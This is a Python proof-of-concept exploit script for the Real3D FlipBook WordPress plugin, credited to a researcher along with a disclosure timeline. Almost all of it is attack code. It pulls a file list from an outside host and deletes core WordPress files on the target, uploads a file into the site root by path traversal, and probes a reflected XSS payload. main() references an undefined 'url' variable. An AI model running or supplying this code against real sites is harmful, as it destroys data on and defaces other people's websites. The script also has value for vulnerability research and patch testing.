# [+] [POC][Exploit] CodeCanyon Real3D FlipBook WordPress Plugin
# [+] Multiple Vulnerabilities Found by: Mukarram Khalid
# [+] Requirements : Python 3.4.x or higher, Requests Module
# [+] Timeline: Vuln Found : 01-07-2016, Reported to Vendor: 03-07-2016
########################################################################
 
import os, json, base64
try:
    import requests
except:
    exit(&#039;[-] Importing Requests module failed&#039;)
 
class wpFlipbook:
 
    headers  = {&#039;User-agent&#039; : &#039;Mozilla/11.0&#039;}
    payload1 = {&#039;deleteBook&#039; : &#039;&#039;}
    payload2 = {&#039;imgbase&#039; : &#039;&#039;, &#039;bookName&#039; : &#039;../../../&#039;, &#039;pageName&#039; : &#039;makman&#039;}
    payload3 = {&#039;action&#039; : &#039;delete&#039;, &#039;bookId&#039; : &#039;<script>alert(/makman/)</script>&#039;}
    imageUrl = &#039;http://makman.tk/makman.jpg&#039;
    wpFilesUrl = &#039;http://makman.tk/wpFiles.json&#039;
 
    def __init__(self, url):
        url = url.rstrip(&#039;/&#039;)
        if &#039;http://&#039; in url or &#039;https://&#039; in url:
            self.url = url
        else:
            self.url = &#039;http://&#039; + url
 
    def http(self, url, data = {}, post = False):
        try:
            if post:
                r = requests.post(url, data = data, headers = self.headers, timeout = 20)
            else:
                r = requests.get(url, params = data, headers = self.headers, timeout = 20)
        except:
            exit(&#039;[-] Something went wrong. Please check your internet connection&#039;)
        return r
 
    def deleteFiles(self):
        r = self.http(self.wpFilesUrl)
        wpFiles = json.loads(r.text)
        print(&#039;[+] Creating directory real3dflipbook&#039;)
        r = self.http(self.url + &#039;/wp-content/plugins/real3d-flipbook/includes/process.php&#039;, {&#039;imgbase&#039; : &#039;makman&#039;}, True)
        print(&#039;[+] Deleting Files from wp-includes/ & wp-admin/&#039;)
        for wpFile in wpFiles[&#039;wpFiles&#039;]:
            print(&#039;    [+] Deleting File &#039; + wpFile)
            self.payload1[&#039;deleteBook&#039;] = wpFile
            r = self.http(self.url + &#039;/wp-content/plugins/real3d-flipbook/includes/process.php&#039;, self.payload1, True)
        print(&#039;[+] Files have been deleted successfully&#039;)
 
    def uploadImage(self):
        print(&#039;[+] Loading image file&#039;)
        r = self.http(&#039;http://makman.tk/makman.jpg&#039;)
        encodedImage = base64.b64encode(r.content)
        self.payload2[&#039;imgbase&#039;] = &#039;;,&#039; + encodedImage.decode(&#039;utf-8&#039;)
        print(&#039;[+] Uploading image file in target root directory&#039;)
        r = self.http(self.url + &#039;/wp-content/plugins/real3d-flipbook/includes/process.php&#039;, self.payload2, True)
        print(&#039;[+] Image has been uploaded here &#039; + self.url + &#039;/&#039; + self.payload2[&#039;pageName&#039;] + &#039;.jpg&#039;)
 
    def xss(self):
        print(&#039;[+] Checking XSS payload&#039;)
        r = self.http(self.url + &#039;/wp-content/plugins/real3d-flipbook/includes/flipbooks.php&#039;, self.payload3)
        if self.payload3[&#039;bookId&#039;] in r.text:
            print(&#039;[+] Found XSS here :&#039;)
            print(&#039;    [+] &#039; + self.url + &#039;/wp-content/plugins/real3d-flipbook/includes/flipbooks.php?action=&#039; + self.payload3[&#039;action&#039;] + &#039;&bookId=&#039; + self.payload3[&#039;bookId&#039;])
 
#########################################################################################################
 
def banner():
    os.system(&#039;cls&#039; if os.name == &#039;nt&#039; else &#039;clear&#039;)
    tabs = &#039;    &#039;
    print(tabs + &#039;*******************************************************************&#039;)
    print(tabs + &#039;* [+] [POC][Exploit] CodeCanyon Real3D FlipBook WordPress Plugin  *&#039;)
    print(tabs + &#039;* [+] Multiple Vulnerabilities Found by:                          *&#039;)
    print(tabs + &#039;* [+] https://mukarramkhalid.com                                  *&#039;)
    print(tabs + &#039;*******************************************************************\n\n&#039;)
 
def main():
    banner()
    exploit = wpFlipbook(url)
    exploit.deleteFiles()
    exploit.uploadImage()
    exploit.xss()
    print(&#039;[+] Done&#039;)
 
if __name__ == &#039;__main__&#039;:
    try:
        main()
    except KeyboardInterrupt:
        exit(&#039;\n[-] CTRL-C detected.\n&#039;)
# End

